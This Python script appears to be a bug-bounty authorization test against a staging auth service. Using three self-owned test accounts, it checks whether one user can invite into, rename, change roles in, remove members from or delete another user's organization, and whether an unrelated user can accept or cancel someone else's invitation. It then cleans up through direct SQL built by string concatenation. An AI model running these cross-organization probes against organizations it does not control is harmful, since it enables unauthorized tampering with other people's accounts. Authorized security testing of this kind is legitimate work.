# -*- coding: utf-8 -*-
"""V19: CROSS-ENTITY org matrix - the real depth test.
All prior V7-V17 tests operated INSIDE one org (owner/member/ghost same org).
NEVER tested: unrelated user (not a member of org X) operating org X, and
cross-identity invitation accept. This is the true authz boundary.
Setup: U1 owns org A, U2 owns org B (both unrelated to other's org).
1. U1 x org B: list-invitations/invite/update-role/remove/update/leave/delete
2. cross-identity accept: U1 invites U3 to org A; U2 (not U3) accepts iid
3. cross-identity reject/cancel by unrelated user
4. response field audit of list-invitations / organization list"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"
ONCE = "libobo1229+v19x%s@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if origin is not None:
            hdrs["Origin"] = origin
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.4)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.4)
        return None, str(e)[:120], ""


def auth(email, pw=PASS):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": pw})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V19 CROSS-ENTITY org matrix ==")
    fetch_db_uri()
    c1, c2, c3 = auth(U1), auth(U2), auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not (c1 and c2 and c3):
        return
    # org A (U1) and org B (U2)
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v19-A", "slug": "v19a%d" % int(time.time())}, c1)
    orgA = json.loads(d).get("id") if st == 200 else None
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v19-B", "slug": "v19b%d" % int(time.time())}, c2)
    orgB = json.loads(d).get("id") if st == 200 else None
    out("orgA=%s orgB=%s" % (orgA, orgB))
    if not (orgA and orgB):
        return
    # get a real member id in org B (U2 is owner)
    r = dbq('SELECT id FROM neon_auth.member WHERE "organizationId"=%s AND "userId"='
            '(SELECT id FROM neon_auth.user WHERE email=%s)'
            % ("'" + orgB + "'", "'" + U2 + "'"))
    mB = str(r[0][0]) if r else None
    out("memberB=%s" % mB)
    once = ONCE % (str(int(time.time()))[-6:])

    out("--- 1. U1 (orgA owner, UNRELATED to orgB) x orgB ---")
    st, d, _ = na("GET", "/neondb/auth/organization/list-invitations?organizationId=%s" % orgB, cookie=c1)
    out("list-invitations orgB  -> %d %s" % (st, d[:150]))
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": orgB, "email": once, "role": "member"}, c1)
    out("invite-member orgB     -> %d %s" % (st, d[:150]))
    if st == 200:
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s'
                % ("'" + orgB + "'", "'" + once + "'"))
        if r:
            dbq('DELETE FROM neon_auth.invitation WHERE id=%s' % ("'" + str(r[0][0]) + "'"))
        out("   !! INVITED INTO FOREIGN ORG - cleaned")
    if mB:
        st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                      {"organizationId": orgB, "memberId": mB, "role": "admin"}, c1)
        out("update-role orgB       -> %d %s" % (st, d[:150]))
        if st == 200:
            out("   !! ROLE CHANGED IN FOREIGN ORG")
            na("POST", "/neondb/auth/organization/update-member-role",
               {"organizationId": orgB, "memberId": mB, "role": "owner"}, c2)
    st, d, _ = na("POST", "/neondb/auth/organization/update",
                  {"organizationId": orgB, "data": {"name": "HACKED"}}, c1)
    out("update orgB            -> %d %s" % (st, d[:150]))
    if st == 200:
        out("   !! ORG B RENAMED BY FOREIGN USER")
        na("POST", "/neondb/auth/organization/update",
           {"organizationId": orgB, "data": {"name": "v19-B"}}, c2)
    st, d, _ = na("POST", "/neondb/auth/organization/leave",
                  {"organizationId": orgB}, c1)
    out("leave orgB (U1)        -> %d %s" % (st, d[:150]))
    if mB:
        st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                      {"organizationId": orgB, "memberIdOrEmail": mB}, c1)
        out("remove-member orgB     -> %d %s" % (st, d[:150]))
        if st == 200:
            out("   !! MEMBER REMOVED IN FOREIGN ORG")
            na("POST", "/neondb/auth/organization/invite-member",
               {"organizationId": orgB, "email": U2, "role": "owner"}, c2)
    st, d, _ = na("POST", "/neondb/auth/organization/delete",
                  {"organizationId": orgB}, c1)
    out("delete orgB (U1)       -> %d %s" % (st, d[:150]))
    if st == 200:
        out("   !! FOREIGN ORG DELETED - CRITICAL")

    out("--- 2. cross-identity accept ---")
    # org A: U1 invites U3; U2 (unrelated) tries to accept
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": orgA, "email": U3, "role": "member"}, c1)
    out("invite U3 -> %d" % st)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + orgA + "'", "'" + U3 + "'", "'pending'"))
    iA3 = str(r[0][0]) if r else None
    if iA3:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iA3}, c2)
        out("U2 accept U3's invite -> %d %s" % (st, d[:200]))
        r = dbq('SELECT status FROM neon_auth.invitation WHERE id=%s' % ("'" + iA3 + "'"))
        out("   invite status: %s" % r)
        r = dbq('SELECT "userId" FROM neon_auth.member WHERE "organizationId"=%s AND "userId"='
                '(SELECT id FROM neon_auth.user WHERE email=%s)'
                % ("'" + orgA + "'", "'" + U2 + "'"))
        out("   U2 member of orgA? %s" % bool(r))
        if not r:
            # still pending; now U3 accepts legitimately (ctrl)
            st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                          {"invitationId": iA3}, c3)
            out("U3 accept own (ctrl)  -> %d" % st)
    out("--- 3. cross-identity reject/cancel by unrelated ---")
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": orgA, "email": U3, "role": "member"}, c1)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + orgA + "'", "'" + U3 + "'", "'pending'"))
    iA3b = str(r[0][0]) if r else None
    if iA3b:
        st, d, _ = na("POST", "/neondb/auth/organization/reject-invitation",
                      {"invitationId": iA3b}, c2)
        out("U2 reject U3's invite -> %d %s" % (st, d[:150]))
        st, d, _ = na("POST", "/neondb/auth/organization/cancel-invitation",
                      {"invitationId": iA3b}, c2)
        out("U2 cancel U3's invite -> %d %s" % (st, d[:150]))
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iA3b}, c3)
        out("U3 accept after tries -> %d %s" % (st, d[:150]))
    out("--- 4. list responses field audit ---")
    st, d, _ = na("GET", "/neondb/auth/organization/list", cookie=c1)
    out("U1 org list -> %d %s" % (st, d[:300]))
    # cleanup orgs
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": orgA}, c1)
    out("del orgA -> %d" % st)
    if st != 200:
        dbq('DELETE FROM neon_auth.organization WHERE id=%s' % ("'" + orgA + "'"))
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": orgB}, c2)
    out("del orgB -> %d" % st)
    if st != 200:
        dbq('DELETE FROM neon_auth.organization WHERE id=%s' % ("'" + orgB + "'"))
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId" IN (%s,%s)' % ("'" + orgA + "'", "'" + orgB + "'"))
    dbq('DELETE FROM neon_auth.member WHERE "organizationId" IN (%s,%s)' % ("'" + orgA + "'", "'" + orgB + "'"))
    out("done")


if __name__ == "__main__":
    main()
